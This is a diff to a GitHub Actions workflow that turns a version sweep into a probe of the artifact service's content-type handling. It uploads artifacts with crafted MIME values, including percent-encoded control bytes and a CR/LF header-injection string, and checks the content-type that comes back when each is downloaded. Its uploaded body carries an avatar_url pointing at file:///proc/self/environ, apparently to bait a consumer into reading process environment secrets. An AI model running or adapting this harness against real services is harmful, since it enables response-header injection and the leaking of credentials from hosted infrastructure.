@@ -10,7 +10,7 @@ jobs:
     steps:
       - name: deps
         run: npm install --no-save --no-audit --no-fund @actions/artifact@6.3.1
-      - name: version sweep
+      - name: mime pct probe
         uses: actions/github-script@v7
         env:
           GITHUB_TOKEN: ${{ github.token }}
@@ -27,8 +27,11 @@ jobs:
             const repo = process.env.GITHUB_REPOSITORY;
             const stamp = process.env.GITHUB_RUN_ID;
             const sha = b => createHash('sha256').update(b).digest('hex');
-            const BODY = Buffer.from('{"full_name":"x","owner":{"login":"c","avatar_url":"file:///proc/self/environ"}}','utf8');
-            const J85 = 'application/json\u0085';
+            const BODY = Buffer.from(JSON.stringify({
+              full_name: 'repo-cassette-pwn',
+              owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
+              description: 'repo cassette', stargazers_count: 0,
+            }), 'utf8');
             const req = (url, method='GET', body=null, headers={}) => new Promise((res, rej) => {
               const u = new URL(url);
               const r = https.request(u, {method, headers, timeout: 30000}, resp => {
@@ -39,30 +42,42 @@ jobs:
               if (body) r.write(body); r.end();
             });
             const ctHex = r => { const o=[]; for(let i=0;i<r.raw.length;i+=2) if(r.raw[i].toLowerCase()==='content-type') o.push(Buffer.from(r.raw[i+1],'latin1').toString('hex')); return o; };
-            async function run(ver) {
-              const name = `rc-v${ver}-${stamp}`;
-              const out = {ver};
+            async function run(label, mime) {
+              const name = `rc-p-${label}-${stamp}`;
+              const out = {label, mimeHex: Buffer.from(mime,'utf8').toString('hex')};
               try {
-                const created = await client.CreateArtifact({...ids, name, version: ver, mimeType: StringValue.create({value: 'application/json'})});
+                const created = await client.CreateArtifact({...ids, name, version: 7, mimeType: StringValue.create({value: mime})});
                 out.createOk = !!created.ok;
-                if (!created.ok) { console.log('RCV '+JSON.stringify(out)); return; }
+                if (!created.ok) throw new Error('CreateArtifact ok=false');
                 const up = created.signedUploadUrl;
-                out.put = (await req(up,'PUT',BODY,{'x-ms-blob-type':'BlockBlob','x-ms-blob-content-type':J85,'Content-Length':String(BODY.length)})).status;
+                out.put = (await req(up,'PUT',BODY,{'x-ms-blob-type':'BlockBlob','Content-Length':String(BODY.length)})).status;
                 const fin = await client.FinalizeArtifact({...ids, name, size:String(BODY.length), hash:StringValue.create({value:`sha256:${sha(BODY)}`})});
                 out.finalizeOk = !!fin.ok;
-                if (!fin.ok) { console.log('RCV '+JSON.stringify(out)); return; }
+                if (!fin.ok) throw new Error('FinalizeArtifact ok=false');
                 out.artifactId = String(fin.artifactId);
                 const api = await req(`https://api.github.com/repos/${repo}/actions/artifacts/${out.artifactId}/zip`,'GET',null,{
                   Authorization:`Bearer ${process.env.GITHUB_TOKEN}`, Accept:'application/vnd.github.v3+json', 'User-Agent':'rc'});
                 out.restStatus = api.status;
                 if (api.status===302 && api.headers.location) {
-                  out.hasRsct = /[?&]rsct=/.test(api.headers.location);
-                  const final = await req(new URL(api.headers.location).href);
-                  out.servedCtHex = ctHex(final);
-                  out.bodyMatch = final.body.equals(BODY);
+                  const loc = api.headers.location;
+                  const m = /[?&]rsct=([^&]*)/.exec(loc);
+                  out.rsctRaw = m ? m[1] : null;
+                  out.rsctDecodedHex = m ? Buffer.from(decodeURIComponent(m[1]),'latin1').toString('hex') : null;
+                  let fr;
+                  try { fr = await req(new URL(loc).href); out.finalStatus = fr.status; out.servedHex = ctHex(fr); out.bodyMatch = fr.body.equals(BODY); }
+                  catch(e) { out.fetchErr = String(e.code||e.message).slice(0,60); }
                 }
-              } catch(e){ out.error = String(e.message||e).slice(0,160).replace(/https?:\/\/\S+/g,'[url]'); }
-              console.log('RCV '+JSON.stringify(out));
+              } catch(e){ out.error = String(e.message||e).slice(0,200).replace(/https?:\/\/\S+/g,'[url]'); }
+              console.log('RCP ' + JSON.stringify(out));
             }
-            for (const v of [1,2,3,4,5,6,7,8]) await run(v);
-            console.log('RCV DONE');
+            await run('ctl',        'application/json');
+            await run('pct85',      'application/json%85');
+            await run('pct2585',    'application/json%2585');
+            await run('lead85',     '%85application/json');
+            await run('pct1c',      'application/json%1C');
+            await run('pct0d0a',    'application/json%0D%0AX-Inject:1');
+            await run('pct09',      'application/json%09');
+            await run('pct20',      'application/json%20');
+            await run('param85',    'application/json;x=%85');
+            await run('comma85',    'application/json,%85');
+            console.log('RCP DONE');
